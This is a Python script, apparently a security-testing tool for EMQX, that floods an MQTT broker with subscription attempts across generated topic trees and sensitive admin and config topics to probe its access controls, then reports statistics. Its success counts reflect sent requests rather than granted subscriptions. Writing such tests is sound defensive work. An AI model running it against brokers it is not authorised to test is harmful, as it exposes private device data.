#!/usr/bin/env python3
"""
MQTT Brute-force Subscribe Attack Script (Windows Compatible)
=============================================================
Simulates brute-force subscription attempts to test EMQX ACL and authentication.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class BruteForceSubscribeAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.clients = []
        self.attack_stats = {
            "subscriptions_attempted": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "connections_failed": 0,
            "auth_failures": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def brute_force_worker(self, worker_id, target_topics, delay_ms=100):
        """Worker thread for brute-force subscribe attack"""
        client_id = f"bruteforce_sub_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        def on_connect(client, userdata, flags, rc, properties):
            if rc == 0:
                print(f" Worker {worker_id}: Connected, starting brute-force subscribe...")
                
                # Try to subscribe to each target topic
                for topic in target_topics:
                    try:
                        result = client.subscribe(topic, qos=1)
                        self.attack_stats["subscriptions_attempted"] += 1
                        
                        if result[0] == 0:
                            self.attack_stats["subscriptions_successful"] += 1
                            print(f" Worker {worker_id}: Successfully subscribed to {topic}")
                        else:
                            self.attack_stats["subscriptions_failed"] += 1
                            print(f" Worker {worker_id}: Failed to subscribe to {topic}")
                        
                        # Delay between attempts
                        if delay_ms > 0:
                            time.sleep(delay_ms / 1000.0)
                            
                    except Exception as e:
                        self.attack_stats["subscriptions_failed"] += 1
                        print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed: {rc}")
                if rc == 4:  # Bad username or password
                    self.attack_stats["auth_failures"] += 1
                self.attack_stats["connections_failed"] += 1
        
        def on_subscribe(client, userdata, mid, granted_qos, properties):
            print(f" Worker {worker_id}: Subscription granted with QoS {granted_qos}")
        
        try:
            client.on_connect = on_connect
            client.on_subscribe = on_subscribe
            
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            # Wait for all subscriptions to complete
            time.sleep(len(target_topics) * delay_ms / 1000.0 + 5)
            
            print(f" Worker {worker_id}: Completed brute-force subscribe attack")
            
        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def generate_target_topics(self, base_topics=None):
        """Generate comprehensive list of target topics for brute-force"""
        if base_topics is None:
            base_topics = [
                "factory", "system", "admin", "security", "config", "debug",
                "test", "monitor", "status", "telemetry", "command", "control"
            ]
        
        target_topics = []
        
        # Single level topics
        for base in base_topics:
            target_topics.append(base)
        
        # Two level topics
        for base in base_topics:
            for sub in ["tenantA", "tenantB", "admin", "system", "test"]:
                target_topics.append(f"{base}/{sub}")
        
        # Three level topics
        for base in base_topics:
            for tenant in ["tenantA", "tenantB", "admin"]:
                for device in ["Temperature", "Humidity", "Motion", "CO-Gas", "Smoke"]:
                    target_topics.append(f"{base}/{tenant}/{device}")
        
        # Four level topics
        for base in base_topics:
            for tenant in ["tenantA", "tenantB"]:
                for device in ["Temperature", "Humidity", "Motion"]:
                    for action in ["telemetry", "command", "status", "config"]:
                        target_topics.append(f"{base}/{tenant}/{device}/{action}")
        
        # Sensitive topics (should be blocked)
        sensitive_topics = [
            "admin/system/config",
            "admin/system/users",
            "admin/system/acl",
            "admin/system/logs",
            "security/alerts",
            "security/events",
            "config/database",
            "config/network",
            "debug/internal",
            "debug/system"
        ]
        target_topics.extend(sensitive_topics)
        
        # Random topics
        for i in range(50):
            random_topic = f"random/{random.randint(1,100)}/{random.randint(1,100)}"
            target_topics.append(random_topic)
        
        return target_topics
    
    def launch_attack(self, num_workers=3, delay_ms=100, custom_topics=None):
        """Launch brute-force subscribe attack"""
        if custom_topics:
            target_topics = custom_topics
        else:
            target_topics = self.generate_target_topics()
        
        print(f" Starting Brute-force Subscribe Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Target topics: {len(target_topics)}")
        print(f"   Delay between attempts: {delay_ms}ms")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.brute_force_worker,
                args=(i, target_topics, delay_ms)
            )
            threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Subscriptions attempted: {self.attack_stats['subscriptions_attempted']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Subscriptions failed: {self.attack_stats['subscriptions_failed']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Authentication failures: {self.attack_stats['auth_failures']}")
        
        if self.attack_stats['subscriptions_attempted'] > 0:
            success_rate = (self.attack_stats['subscriptions_successful'] / 
                           self.attack_stats['subscriptions_attempted'] * 100)
            print(f"Subscription success rate: {success_rate:.1f}%")
        
        if duration > 0:
            print(f"Attempts per second: {self.attack_stats['subscriptions_attempted']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Brute-force Subscribe Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--delay", type=int, default=100, help="Delay between attempts (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom target topics")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = BruteForceSubscribeAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        num_workers=args.workers,
        delay_ms=args.delay,
        custom_topics=args.topics
    )

if __name__ == "__main__":
    main()
